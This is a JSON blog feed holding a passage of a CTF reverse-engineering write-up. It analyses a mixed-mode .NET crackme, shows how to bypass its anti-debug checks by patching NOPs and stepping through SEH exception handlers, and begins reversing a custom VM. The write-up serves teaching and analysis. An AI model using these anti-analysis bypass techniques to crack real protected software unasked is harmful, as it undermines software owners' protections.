{
    "version": "https://jsonfeed.org/version/1",
    "title": "The Workshop",
    "subtitle": "",
    "icon": "https://the-m3chanic.github.io/images/favicon.ico",
    "description": "",
    "home_page_url": "https://the-m3chanic.github.io",
    "items": [
        {
            "id": "https://the-m3chanic.github.io/2025/07/16/avernos-bi0s-CTF-2025/",
            "url": "https://the-m3chanic.github.io/2025/07/16/avernos-bi0s-CTF-2025/",
            "title": "avernos - bi0s CTF 2025",
            "date_published": "2025-07-16T22:09:33.000Z",
            "content_html": "<p><strong>tl;dr</strong></p>\n<ul>\n<li>Mixed mode assembly (a feature of .NET binaries), involving both C# as well as C++ code in the same executable</li>\n<li>Code flow jumps between both C#/C++ frequently to make analysis harder</li>\n<li>SEH mechanism triggered in C++ code, which uses SEH trampoline to make debugging harder</li>\n<li>SEH triggered once again in C#, which is handled by C++</li>\n<li>VM bytecode is decrypted loaded by C#</li>\n<li>VM checks input in 4 ways: CRC32 hash (2 byte pairs), RC4 encryption, rolling XOR and byte by byte checks</li>\n</ul>\n<p><strong>Challenge Points</strong>: 838<br />\n<strong>No. of solves</strong>: 18<br />\n<strong>Challenge author</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf\">the.m3chanic</span></p>\n<h2 id=\"challenge-description\"><a class=\"anchor\" href=\"#challenge-description\">#</a> Challenge Description</h2>\n<p><code>An ancient engine stirs in the dark. It speaks no language you know.</code></p>\n<h3 id=\"prelude\"><a class=\"anchor\" href=\"#prelude\">#</a> Prelude</h3>\n<p>[Note: I will be showing you the author mindset, on how one can approach such a challenge - this will not be a very ctf-style writeup, but more of a teaching process]</p>\n<p>After reading this writeup, you will (hopefully) be able to:</p>\n<ul>\n<li>Identify and analyse Mixed Mode .NET samples</li>\n<li>Reverse Engineer a custom Virtual Machine</li>\n</ul>\n<h2 id=\"analysis\"><a class=\"anchor\" href=\"#analysis\">#</a> Analysis</h2>\n<p>I will be splitting this writeup into 3 main parts:</p>\n<ul>\n<li>What is mixed mode assembly?</li>\n<li>Reversing mixed mode samples (using this challenge as an example)</li>\n<li>The VM</li>\n</ul>\n<p>Before jumping into reading this, I would suggest some prerequisite reading on the following topics:</p>\n<ul>\n<li>What is .NET? (<a href=\"https://the-m3chanic.github.io/2024/05/08/R2R-Ready-to-Run-Stomping-WTF/\">My blog which explains it</a>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL2RvdG5ldC9mcmFtZXdvcmsvZ2V0LXN0YXJ0ZWQvb3ZlcnZpZXc=\">Microsoft reference</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2NzaGFycC9jb21tZW50cy8xN3B1N2Z4L2Nhbl9hbnlvbmVfZXhwbGFpbl93aGF0X2lzX25ldC8=\">Reddit</span>)</li>\n<li>What are &quot;managed&quot; and &quot;native&quot; methods? (<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BEZXZDaHkvbWFuYWdlZC12cy11bm1hbmFnZWQtY29kZS1lY2VmM2FmZjJkNjU=\">Medium post</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL2RvdG5ldC9zdGFuZGFyZC9tYW5hZ2VkLWNvZGU=\">Microsoft reference</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvbWFuYWdlZC1jb2RlLWFuZC11bm1hbmFnZWQtY29kZS1pbi1uZXQv\">GFG</span>)</li>\n</ul>\n<h2 id=\"mixed-mode-assembly\"><a class=\"anchor\" href=\"#mixed-mode-assembly\">#</a> Mixed mode assembly</h2>\n<h3 id=\"what-is-mixed-mode-assembly\"><a class=\"anchor\" href=\"#what-is-mixed-mode-assembly\">#</a> What is mixed mode assembly?</h3>\n<p>A <em>mixed mode assembly</em> in .NET refers to a compiled binary that contains both <strong>managed</strong> as well as <strong>unmanaged</strong> code. To break that down:</p>\n<ul>\n<li><strong>Managed code</strong> is the code that runs under the control of the .NET Common Language Runtime (CLR). Examples of this include C# or <span class=\"exturl\" data-url=\"aHR0cDovL1ZCLk5FVA==\">VB.NET</span> code</li>\n<li><strong>Unmanaged code</strong> is code that runs directly on the Windows OS without the CLR's oversight, and this is typically written in C/C++</li>\n</ul>\n<h3 id=\"why-use-mixed-mode\"><a class=\"anchor\" href=\"#why-use-mixed-mode\">#</a> Why use mixed mode?</h3>\n<p>Functionally, there are many beneficial use cases of having both managed as well as unmanaged code in the same binary. Some of them include:</p>\n<ul>\n<li>interoperability between the two modes</li>\n<li>Optimising performance-critical sections of managed code (C++ runs way faster than managed code)</li>\n<li>Leveraging existing code by taking advantage of interoperability between managed and unmanaged code</li>\n</ul>\n<p>They are enabled using C++/CLI (Common Language Infrastructure), which allows C++ to interoperate directly with .NET classes. This allows you to write native code as well as managed code in the same project and even in the same source file.</p>\n<h3 id=\"how-does-it-work-under-the-hood\"><a class=\"anchor\" href=\"#how-does-it-work-under-the-hood\">#</a> How does it work under the hood?</h3>\n<p>Mixed mode assemblies are unique because they satisfy two very different runtime expectations simultaneously: the native Windows loader and the .NET CLR. How does this work in practice though?</p>\n<ul>\n<li>A mixed mode binary is still a standard PE file</li>\n<li>It contains both:\n<ul>\n<li>Native sections:  <code>.text</code> ,  <code>.data</code> ,  <code>.rdata</code> , etc., compiled from C++</li>\n<li>Managed metadata: a CLR header, metadata tables, and IL bytecode (if present)</li>\n</ul>\n</li>\n<li>When the OS loads the binary, it sees the native entry point ( <code>WinMain</code> ) and begins execution like a regular native application</li>\n<li>Simultaneously, because the PE includes a CLR header and its metadata, the .NET runtime is also initialised and loaded via the  <code>_CorExeMain</code>  or  <code>_CorDllMain</code> , depending on whether it's an EXE or DLL</li>\n</ul>\n<h3 id=\"loader-behaviour\"><a class=\"anchor\" href=\"#loader-behaviour\">#</a> Loader behaviour</h3>\n<ul>\n<li>The Windows PE loader first processes the native parts. This allows the mixed mode assembly to include custom startup routines written in native code</li>\n<li>Usually, this begins with  <code>mainCRTStartup</code> , which is the standard C runtime startup stub generated by the MSVC toolchain. This stub sets up the runtime environment, initialises global variables, and eventually calls  <code>main</code> ,  <code>WinMain</code> , or  <code>wWinMain</code>  - depending on the system</li>\n<li>In a mixed mode assembly, this native entry point might call  <code>_CorExeMain</code> , which is responsible for bootstrapping the CLR</li>\n<li>These two systems <em>coexist in the same process space</em>, which is what makes mixed mode so difficult to analyse</li>\n</ul>\n<p><strong>Note</strong>: Not all mixed mode binaries use  <code>mainCRTStartup</code>  directly. Some may use a custom entry point or modified CRT startup to gain more control over execution flow. However, in most cases compiled via standard C++/CLI,  <code>mainCRTStartup</code>  is the default native entry point.</p>\n<ul>\n<li>Functions written in managed code can call native functions using <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke\"> <code>P/Invoke</code> </a> or  <code>DllImport</code>  attributes</li>\n<li>Native code compiled with C++/CLI can directly reference and instantiate managed types</li>\n<li>This means the transition between C# and C++ isn‚Äôt just at a function-level - it can go as deep as shared objects and class methods</li>\n</ul>\n<p>In essence, mixed mode assemblies live in both worlds simultaneously. They can present a well behaved .NET facade while hiding all the juicy logic and the humble malware code on the native side (which are completely opaque to most .NET tools).</p>\n<h2 id=\"reversing-a-mixed-mode-sample\"><a class=\"anchor\" href=\"#reversing-a-mixed-mode-sample\">#</a> Reversing a Mixed Mode sample</h2>\n<p>So let us begin analysis of this sample as we would for any binary - starting from how you would even identify whether a sample is mixed-mode or not.</p>\n<p>Running  <code>file</code>  on the sample tells us it's a  <code>x86-64 Mono/.NET assembly</code>  file<br />\n<img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image.png\" alt=\"output of the file command\" /></p>\n<p>This does not wave any red flags, just tells us this binary has managed code. Nothing too special.</p>\n<p>One thing I like to do to get this confusion out of the way always is to open the binary in a PE-inspection tool like <a href=\"https://ntcore.com/explorer-suite/\"> <code>CFF Explorer</code> </a>, and check out if it has a IL entry point or not.<br />\nThe way to do this is to check the  <code>Flags</code>  section in the  <code>.NET Directory</code>  of the binary (I am using CFF Explorer).</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-1.png\" alt=\"cff explorer output\" /></p>\n<p>Check out the 2 flags I've highlighted, these say right off the bat that:</p>\n<ul>\n<li>The binary contains stuff which is <em>not</em> IL code</li>\n<li>The binary does <em>not</em> have a native entrypoint<br />\nWhich means: The binary contains native code and it's startup is in the managed code (which is most definitely  <code>mainCRTStartup</code> )</li>\n</ul>\n<p>Now that we know where the code execution is about to begin, let's open up the binary in a .NET decompiler (I prefer dnSpy for these).</p>\n<p>Another dead giveaway that this binary contains native code is the existence of CPP metadata as shown in dnSpy<br />\n<img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-2.png\" alt=\"dnSpy cpp metadata\" /></p>\n<p>Looking for  <code>mainCRTStartup</code>  in dnSpy:</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-3.png\" alt=\"mainCRTStartup\" /></p>\n<p>Okay, three terms to note before we proceed:</p>\n<h3 id=\"token\"><a class=\"anchor\" href=\"#token\">#</a> Token</h3>\n<ul>\n<li>A unique identifier given to every metadata object (like a method, type, field, etc.)</li>\n<li>A 4-byte value where:\n<ul>\n<li>The high byte indicates the metadata table type</li>\n<li>The low 3 bytes indicate the row index in that table</li>\n</ul>\n</li>\n<li>In our case:  <code>0x0600005D</code> :\n<ul>\n<li><code>0x06</code>  -&gt;  <code>MethodDef</code>  table (all method definitions) (<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnRjb3JlLmNvbS9maWxlcy9kb3RuZXRmb3JtYXQuaHRt\">Source</span>)</li>\n<li><code>0x00005D</code>  -&gt; Row index  <code>0x5D</code></li>\n</ul>\n</li>\n<li>More of this info can be found within  <code>ILDasm</code>  or  <code>dnSpy</code>  itself</li>\n</ul>\n<h3 id=\"rid\"><a class=\"anchor\" href=\"#rid\">#</a> RID</h3>\n<ul>\n<li>This is shorthand for the row index inside the metadata table</li>\n<li>It's the &quot;number&quot; part of the token</li>\n</ul>\n<h3 id=\"rva\"><a class=\"anchor\" href=\"#rva\">#</a> RVA</h3>\n<ul>\n<li>Relative Virtual Address, is the offset (in memory) from the /images/post_images/avernos-bi0s-CTF-2025/image base (typically  <code>0x14000000</code> ) to the method's actual compiled code in the PE's  <code>.text</code>  section</li>\n<li>This is where the JIT compiler (or loader) will find the native stub or unmanaged entry point</li>\n<li>If you open the binary in IDA/Ghidra/Binary Ninja, and go to the offset  <code>0x4464</code> , you will find the implementation of the method/function.</li>\n</ul>\n<h3 id=\"file-offset\"><a class=\"anchor\" href=\"#file-offset\">#</a> File Offset</h3>\n<ul>\n<li>The raw byte offset in the file where this method's code resides on the disk</li>\n<li>This is useful when:\n<ul>\n<li>Looking at the binary in a hex editor</li>\n<li>Manually extracting or patching bytes</li>\n<li>Mapping RVA to file offset via PE Header section tables</li>\n</ul>\n</li>\n</ul>\n<p>So now we know the address of the  <code>mainCRTStartup</code>  method in the native section, it is simply the base address of the loaded /images/post_images/avernos-bi0s-CTF-2025/image in IDA + the  <code>RVA</code>  of the method as shown by dnSpy.</p>\n<p>Now, one thing to note when loading it in a native decompiler/disassembler is to specify to your tool to load it as a  <code>PE</code>  file as compared to a  <code>Microsoft.Net assembly</code>  file.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-4.png\" alt=\"ida pick which file type\" /></p>\n<p>Now, hit  <code>G</code>  to be able to jump to any address, and paste the  <code>base_addr + RVA</code>  value into the field. (Find the base address from  <code>Edit -&gt; Segments -&gt; Rebase Program</code> , and copy the  <code>Value</code>  field from there - for me, the base is  <code>0x140000000</code> ).<br />\nSo the address to jump to, would be  <code>0x140004464</code></p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-5.png\" alt=\"mainCRTStartup\" /></p>\n<p>And just like that, we have our &quot;main&quot; (well, not really)<br />\nIn standard Windows fashion, we need to do a <em>little</em> more digging before we actually find the main code. The first function called usually only performs setup for the actual code to run, which would be the one being returned.</p>\n<p>Similarly, in the next function - look for the 2nd to last function being called after  <code>argv</code> ,  <code>argc</code>  and  <code>envp</code>  are initialised. For us, that would be the function at  <code>0x140003BA0</code>  (line 58 in my decompilation).</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-6.png\" alt=\"argv and argc setup\" /></p>\n<p>Finally, we can start analysing the actual  <code>main</code>  function of the binary.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-7.png\" alt=\"actual main\" /></p>\n<p>From some looking, the function at  <code>0x140003DD8</code>  seems to initialise an array with some unknown values, copies that to the argument passed, then returns it. This return value is then passed to the next function.<br />\nBut if we look at  <code>0x140007070</code> , it just seems to be pointing to some  <code>qword</code>  value, which resolves to  <code>0x6000011</code>  - what could this be?<br />\nThis is actually the  <code>Token</code>  of the method being called from C++ -&gt; C#, and we can use this as a lookup value to find the actual function in C# being referenced.</p>\n<p>If we hop back to dnSpy, and lookup that value in the same  <code>&lt;Module&gt;</code>  place we looked at before, we see this</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-8.png\" alt=\"c# decrypt function\" /></p>\n<p>We can see this performs a XOR decrypt of the byte array provided to it and returns the corresponding result to  <code>v1</code> , which is meant to be a file which is to be opened in read mode, and the file descriptor returned to  <code>v5</code> .<br />\nThe path of the file returned is  <code>/home/the.m3chanic/bi0s-ctf-25/crazy-path/hehe/flag.txt</code>  - which is obviously not going to exist on a given machine. Let us see how this file descriptor is being further used.</p>\n<p>In the remnant of the function, we can see  <code>func2(fd)</code>  is being called with the file descriptor of the  <code>flag.txt</code>  file (which, does not exist btw), which again points to the TID  <code>0x6000009</code> , which if we lookup in dnSpy gives us</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-9.png\" alt=\"dnspy func2 first c# trigger exception\" /></p>\n<p>[I wrote this writeup over multiple days, and it seems my IDA database decided to rebase itself to a different address, the concept of mapping a function from dnSpy to a native decompiler still remains the same though! You can refer to this updated base address hereon:  <code>0x7FF7DF220000</code> ]</p>\n<p>It seems to set up some values, and then XORs something and then divides them with the value it was passed as a parameter. Now we know this value is  <code>0</code>  on our machine, but wouldn't that cause a  <code>DivideByZero</code>  exception?<br />\nLet us take a look at the assembly when  <code>func2(fd)</code>  is being called.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-10.png\" alt=\"try except for func2 call\" /></p>\n<p>Aha! So it is being set up inside a  <code>try</code>  block, and the exception handler for that block is present at  <code>0x7FF7DF223C27</code> , let us see what happens there.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-11.png\" alt=\"first exception handler chain asm\" /></p>\n<p>So as we can see, in the exception handler for our first exception, it is calling a function at  <code>0x7FF7DF22188C</code> , and based on the return value it either exits from the main function or it enters our 2nd interesting block - so it is definitely worth checking out.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-12.png\" alt=\"first anti debug check\" /></p>\n<p>This is a classic anti-debug check, wherein it tries to open the file of the current process. Usually, debuggers read the debug information of the process from the file - and if this handle is not closed then the process cannot open this file - meaning that a failed call indicates the presence of a debugger.</p>\n<p>To bypass this, we can just patch out the call to this anti-debug function with  <code>nops</code>  and patch the  <code>jz</code>  to a  <code>jmp</code> .</p>\n<p>The 2nd block is quite easy as well - it calls  <code>rand()</code> , xors the result with itself and calls  <code>rand()</code>  again and attempts to divide the result with the result of the previous xor (which would be 0) - thus causing a  <code>DivideByZero</code>  exception yet again.<br />\nIf you observe closely, even this 2nd block is wrapped in a  <code>try</code> , which means our  <code>except</code>  (at  <code>0x7FF7DF223C67</code> ) must be where we should look.</p>\n<p>Looking at the block, it calls  <code>0x7FF7DF221924</code>  - which has the same routine as the 2nd interesting block, which again has the same routine - which eventually calls  <code>func6()</code> .</p>\n<p>What we just witnessed in assembly is what I would call a trampoline of sorts. It looks something like this in pseudocode:<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">trampoline1</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    __try &#123;</span><br><span class=\"line\">        cause_exception;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __except &#123;</span><br><span class=\"line\">        handle_exception;</span><br><span class=\"line\">        trampoline2();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">trampoline2</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    __try &#123;</span><br><span class=\"line\">        cause_exception;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __except &#123;</span><br><span class=\"line\">        handle_exception;</span><br><span class=\"line\">        trampoline3();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">trampoline3</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    __try &#123;</span><br><span class=\"line\">        cause_exception;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __except &#123;</span><br><span class=\"line\">        handle_exception;</span><br><span class=\"line\">        func6();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>The way to bypass such exception checks is to identify the address of the handler (in our case, the  <code>__except</code>  block) and set a breakpoint there. Then, let your debugger run and when the exception occurs - pass it to the application instead of letting the debugger handle it. This is the standard way to handle <em>most</em> exception handler checks.</p>\n<p>Again,  <code>func6</code>  has the token  <code>0x6000006</code> , let us inspect that in dnSpy.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-14.png\" alt=\"func6 and func8 in dnspy\" /></p>\n<p>Finally! Some actual stuff.</p>\n<p>This function seems pretty straightforward, too. Asks for user input in the pattern  <code>bi0s&#123;...&#125;</code>  and extracts the content within the flag format.<br />\n <code>func8()</code>  is then called with that input as a parameter.<br />\n <code>func8()</code>  does nothing but inject the extracted input into the input stream.</p>\n<p>It also calls  <code>func1()</code></p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-15.png\" alt=\"func1 dnSpy decompilation\" /></p>\n<p>(I may have forgotten to remove the names of some of the symbols, so this part accidentally gave away the fact that this is a VM ‚ò†Ô∏è nevertheless let us proceed as if we do not know it and see how we can identify one naturally)</p>\n<p>It:</p>\n<ul>\n<li>Checks to see if a variable  <code>global_flag</code>  is set to 1 or not, and exits depending on that</li>\n<li>Calls  <code>decrypt_embedded_instructions()</code></li>\n<li>Calls  <code>func5()</code></li>\n<li>Calls  <code>run_vm()</code></li>\n<li>Based on the result of  <code>run_vm()</code> , will print either of 2 things (which we can guess will be something along the lines of &quot;true&quot; or &quot;false&quot;)</li>\n</ul>\n<p>Let's break these down step by step.</p>\n<p><code>global_flag</code>  is defined at the RVA  <code>0x191B0</code> , which in IDA maps to a global variable. You xref that, you find it is referenced once at a function whose RVA is  <code>0x1880</code> . You can look up this RVA now in dnSpy.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-17.png\" alt=\"0x1880 func1() lookup in dnSpy\" /></p>\n<p>Right click -&gt; Analyse  <code>func11()</code> , and you can find cross references to that function in dnSpy.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-18.png\" alt=\"func11 used by\" /></p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-19.png\" alt=\"func6 calling func11\" /></p>\n<p>We can see that our main logic function (which, if you recall occurs right after an anti-debug check), is benignly setting this variable. No biggie.</p>\n<p>Let's take a look at what  <code>decrypt_embedded_instructions()</code>  does.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-16.png\" alt=\"decrypt_embedded_instructions dnSpy\" /></p>\n<p>It seems to be taking an array  <code>embedded_instructions</code> , and performing the following operation on it:<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">embedded_instruction[i] ^= <span class=\"number\">66</span>;</span><br><span class=\"line\">embedded_instruction[i] = ROR(embedded_instruction[i], <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"comment\">// where ROR() is rotate right </span></span><br></pre></td></tr></table></figure></p>\n<p>Then,  <code>func5()</code>  seems to be defined natively, so we can take a look at that next</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-20.png\" alt=\"load vm bytes function\" /></p>\n<p>This function seems to be copying bytes from the first argument passed, to a global array. The array passed is  <code>embedded_instructions</code> , which was just previously decrypted. A counter seems to be incremented for each loop iteration - let's call that  <code>unc_counter</code>  for now. Although we do know it'll contain the total number of instructions present in the VM.</p>\n<p>Aaand next up, we have  <code>run_vm()</code> , which is going to be our key function to reverse. It is defined at the RVA  <code>0x161C</code> .</p>\n<p>A quick recap before we proceed:</p>\n<ul>\n<li>Some anti-debug checks (using the  <code>CreateFileW</code>  API and SEH)</li>\n<li>User input taken in C# using regex, which is injected into the input stream</li>\n<li>Global flag is set to true</li>\n<li>Another exception trigger from C#, which is handled in C++ then handed back to C#</li>\n<li>An unclear array is decrypted and loaded into a global buffer</li>\n<li>A function  <code>run_vm()</code>  is called</li>\n</ul>\n<h2 id=\"the-vm\"><a class=\"anchor\" href=\"#the-vm\">#</a> The VM</h2>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-21.png\" alt=\"vm setup func\" /></p>\n<p><code>0x7FF7DF221530</code>  sets that memory region to 0.<br />\nIf we look closely at the function defined at  <code>0x7FF7DF221570</code> ,</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-22.png\" alt=\"fetch instruction by counter\" /></p>\n<p>We can see there is a loop being run whose iteration count is the number of instructions loaded into  <code>embedded_instructions</code> . It is loading each element (7 bytes long) from the array, and passing those 7 bytes into a function at  <code>0x7FF7DF221540</code>  and checking its return value against something.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-23.png\" alt=\"alt text\" /></p>\n<p>This returns a  <code>WORD</code>  (16 bit) value in the format  <code>[byte_0 &lt;&lt; 8 | byte_2]</code> . Generally, when we see such weird indices being indexed (especially from a 7 byte long value?), it indicates that the value being indexed might be a structure - and these are members of the structure being accessed.<br />\nSo assuming that it <em>is</em> a structure, we can proceed with a simple structure definition as follows:<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">unc_struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem1;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem2;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem3;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem4;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem5;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem6;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> __int8 elem7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>After changing all relevant occurances of 7 byte arrays to this structure, we can now continue analysis of this function.<br />\nThere is only function call left, which is to  <code>0x7FF7DF221EAC</code> , which takes the memory region previously initialised to 0 and the return value of the previously called function.</p>\n<p>Frankly, there's quite a bit to grasp in this function - lots of weird memory accesses and a ton of cases to analyse. A good practice to follow in cases like these is to see if you can find a pattern/generalise the instructions and see if they're performing something at a higher level.</p>\n<p>Let us see what patterns we can figure out at first glance from this mammoth function:</p>\n<ul>\n<li>The same functions being reused in a lot of places (e.g:  <code>0x7FF7DF2210B0</code> ,  <code>0x7FF7DF2211F0</code> ,  <code>0x7FF7DF221370</code> ,  <code>0x7FF7DF221170</code> ,  <code>0x7FF7DF2211B0</code> ,  <code>0x7FF7DF221230</code> ,  <code>0x7FF7DF221330</code> ,  <code>0x7FF7DF2212F0</code> ,  <code>0x7FF7DF221550</code> ). These might seem like a lot but it's just 9 or 10 functions to reverse which are virtually being used in every case - so if you rev these you rev this entire mammoth!</li>\n<li>A lot of simple arithmetic being performed in each individual case - indicating that this function might be a virtual machine</li>\n<li>The same &quot;control variables&quot; being used in a lot of places - i.e, these variables are used to determine the return values of many functions</li>\n</ul>\n<p>With this in mind, let us start analysing those repetetive functions one at a time.</p>\n<p>(I've renamed each of the functions in the list above in the format  <code>func_&#123;i&#125;_unc</code> )</p>\n<p>If you look at each of the functions in the list above, you will notice a few more patterns. Let us go through each of them here.</p>\n<p><code>unc_mem_buf</code>  being passed as the 1st parameter, and  <code>elem5</code>  being passed as the 2nd parameter. The function uses  <code>elem5</code>  as a &quot;control variable&quot; to pick and return a value from the  <code>unc_mem_buf</code> .</p>\n<p>The list of functions that matches this criteria is:</p>\n<ul>\n<li><code>func_1_unc</code> : Takes  <code>unc_mem_buf</code>  as a  <code>char *</code>  and returns 1 of any 10 bytes from the 0th-10th indices of  <code>unc_mem_buf</code></li>\n<li><code>func_4_unc</code> : Takes  <code>unc_mem_buf</code>  as a  <code>short int *</code>  and returns 1 of any 5  <code>words</code>  from the 10th-20th indices of  <code>unc_mem_buf</code></li>\n<li><code>func_5_unc</code> : Takes  <code>unc_mem_buf</code>  as a  <code>int *</code>  and returns 1 of any 5  <code>ints</code>  from the 20th-40th indices of  <code>unc_mem_buf</code></li>\n<li><code>func_2_unc</code> : Takes  <code>unc_mem_buf</code>  as a  <code>long long int *</code>  and returns 1 of any 5  <code>qwords</code>  from the 40th-80th indices of  <code>unc_mem_buf</code></li>\n</ul>\n<p>We can confidently rename the above 4 functions to  <code>select_byte</code> ,  <code>select_word</code> ,  <code>select_dword</code>  and  <code>select_qword</code>  respectively.</p>\n<p>It is highly risky to define a structure without knowing its size first. However, from the previous function we know that the size of  <code>unc_mem_buf</code>  is  <code>4466</code>  bytes. So we can define a structure with what we know so far, and leave the rest as  <code>pad</code> .</p>\n<p>If we analyse the usage of the return values from the above - we can see that these are being used in the operations that we noticed earlier which hinted at this function potentially being a VM.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-28.png\" alt=\"alt text\" /></p>\n<p>A similar case for the other functions as well. This indicates that those return values are potentially &quot;registers&quot; that are being used inside our VM, meaning that the  <code>select_*</code>  functions we uncovered earlier are in fact functions to select a register from our VM.</p>\n<p>If we were to define this in a strucure now, it would look a little something like:<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> reg_1;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> reg_2;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> reg_3;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> reg_4;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> reg_5;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> reg_6;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> reg_7;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> reg_8;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> reg_9;</span><br><span 